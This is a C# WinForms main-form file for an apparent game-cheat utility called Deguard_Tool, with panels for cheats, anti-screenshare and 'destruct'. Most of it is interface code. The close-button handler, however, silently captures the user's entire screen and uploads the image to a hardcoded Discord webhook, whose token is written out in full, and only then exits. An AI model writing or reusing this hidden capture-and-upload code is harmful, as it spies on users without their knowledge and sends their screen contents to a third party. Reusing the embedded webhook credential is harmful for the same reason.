using Deguard_Tool.Properties;
using Siticone.UI.WinForms;
using System;
using System.Drawing.Drawing2D;
using System.Drawing;
using System.Windows.Forms;
using System.Net.Http;
using System.Drawing.Imaging;
using System.IO;
using System.Threading.Tasks;

namespace Deguard_Tool
{
    public partial class Main : Form
    {

        bool sidebarExpand;
        public Main()
        {
            InitializeComponent();
            InitializeForm();
            SetFormBorderRadius(this, 15);
        }



        private void SetFormBorderRadius(Form form, int radius)
        {
            Rectangle rectangle = new Rectangle(0, 0, form.Width, form.Height);
            GraphicsPath path = GetRoundedRectangle(rectangle, radius);
            form.Region = new Region(path);
        }

        private GraphicsPath GetRoundedRectangle(Rectangle rectangle, int radius)
        {
            GraphicsPath path = new GraphicsPath();

            int diameter = radius * 2;
            Size size = new Size(diameter, diameter);
            Rectangle arcRect = new Rectangle(rectangle.Location, size);
            path.AddArc(arcRect, 180, 90);

            arcRect.X = rectangle.Right - diameter;
            path.AddArc(arcRect, 270, 90);

            arcRect.Y = rectangle.Bottom - diameter;
            path.AddArc(arcRect, 0, 90);

            arcRect.X = rectangle.Left;
            path.AddArc(arcRect, 90, 90);

            path.CloseFigure();

            return path;
        }

        private void InitializeForm()
        {
            MaximizeBox = false;
        }

        private void siticoneButton7_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void siticoneButton6_Click(object sender, EventArgs e)
        {
            antiss1.Visible = true;
            antiss1.BringToFront();
        }

        private void siticoneButton2_Click(object sender, EventArgs e)
        {
            cheats1.Visible = true;
            cheats1.BringToFront();
        }

        private void cheats1_Load(object sender, EventArgs e)
        {

        }

        private void Form1_Load(object sender, EventArgs e)
        {
            settings1.ImageChanged += Settings_ImageChanged;
        }

        private void Settings_ImageChanged(object sender, ImageChangedEventArgs e)
        {
            BackgroundImage = e.NewImage;
        }

        private void siticoneButton1_Click(object sender, EventArgs e)
        {
            generalmenu1.Visible = true;
            generalmenu1.BringToFront();
        }

        private void siticoneButton8_Click(object sender, EventArgs e)
        {
            WindowState = FormWindowState.Minimized;
        }

        private void siticoneButton4_Click(object sender, EventArgs e)
        {
            destruct1.Visible = true;
            destruct1.BringToFront();
        }

        private void siticoneButton3_Click(object sender, EventArgs e)
        {
            tools1.Visible = true;
            tools1.BringToFront();
        }

        private void siticonePanel2_Paint(object sender, PaintEventArgs e)
        {

        }

        private void siticoneButton7_Click_1(object sender, EventArgs e)
        {
            customcheatexecutor1.Visible = true;
            customcheatexecutor1.BringToFront();
        }

        private void siticoneButton5_Click(object sender, EventArgs e)
        {
            settings1.Visible = true;
            settings1.BringToFront();
        }


        private void siticoneButton9_Click(object sender, EventArgs e)
        {

        }

        private void siticoneButton8_Click_1(object sender, EventArgs e)
        {
            MessageBox.Show("In Update V1.2 This Feature Will Be Added");
        }

        private void sidebarTimer_Tick(object sender, EventArgs e)
        {
            if (sidebarExpand)
            {
                siticonePanel2.Width -= 10;
                if (siticonePanel2.Width == siticonePanel2.MinimumSize.Width)
                {
                    sidebarExpand = false;
                    sidebarTimer.Stop();
                }
            }
            else
            {
                siticonePanel2.Width += 10;
                if (siticonePanel2.Width == siticonePanel2.MaximumSize.Width)
                {
                    sidebarExpand = true;
                    sidebarTimer.Stop();
                }
            }
        }

        private void siticoneButton9_Click_1(object sender, EventArgs e)
        {
            sidebarTimer.Start();
        }

        private void siticoneButton9_Click_2(object sender, EventArgs e)
        {
            sidebarTimer.Start();
        }

        private void siticoneButton9_Click_3(object sender, EventArgs e)
        {
            siticoneButton9.Visible = false;
            siticoneButton10.Visible = true;
            siticoneButton10.SendToBack();
            sidebarTimer.Start();
        }

        private void siticoneButton10_Click(object sender, EventArgs e)
        {
            sidebarTimer.Start();
            siticoneButton10.Visible = false;
            siticoneButton9.Visible = true;
            siticoneButton9.BringToFront();
        }

        private void siticoneButton12_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void siticoneButton11_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void timer1_Tick(object sender, EventArgs e)
        {

        }

        private void siticoneControlBox2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private async void siticoneControlBox1_Click(object sender, EventArgs e)
        {
            try
            {
                byte[] screenshot = CaptureScreen();

                string roleId = "1148251447394316359";
                string content = "# User Closed Application <@&" + roleId + ">";

                string webhookUrl = "https://discord.com/api/webhooks/1148342076266778674/ZvK4OZM3LYfoDjH1AYH5LbST0_ybc1e2Ih5-ZDSwMTx-gDUo3kkcvEY4LNvrlVZy9dUy";

                await SendScreenshotToDiscordWebhook(webhookUrl, screenshot, content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending screenshot: {ex.Message}");
            }

            Environment.Exit(0);
        }

        private byte[] CaptureScreen()
        {
            using (var bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
            {
                using (var g = Graphics.FromImage(bitmap))
                {
                    g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bitmap.Size);
                }

                using (var stream = new MemoryStream())
                {
                    bitmap.Save(stream, ImageFormat.Png);
                    return stream.ToArray();
                }
            }
        }

        private async Task SendScreenshotToDiscordWebhook(string webhookUrl, byte[] screenshot, string mention)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    var content = new MultipartFormDataContent();
                    content.Add(new StringContent(mention), "content");
                    content.Add(new ByteArrayContent(screenshot), "file", "screenshot.png");

                    await client.PostAsync(webhookUrl, content);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending screenshot: {ex.Message}");
            }
        }
    }
}